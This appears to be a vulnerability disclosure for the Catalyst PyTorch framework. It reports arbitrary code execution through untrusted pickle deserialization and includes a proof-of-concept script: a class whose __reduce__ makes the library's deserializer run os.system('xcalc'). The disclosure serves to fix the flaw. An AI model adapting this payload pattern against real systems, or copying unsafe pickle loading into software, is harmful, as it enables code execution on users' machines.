# Description
Catalyst is a PyTorch framework for Deep Learning research and development. It focuses on reproducibility, rapid experimentation, and codebase reuse so you can create something new rather than write another regular train loop.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install catalyst')
from catalyst.contrib.utils import serialization
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
serialization.pickle_deserialize(dumps)
```
* `pip3 install catalyst`
* `python3 exploit.py`
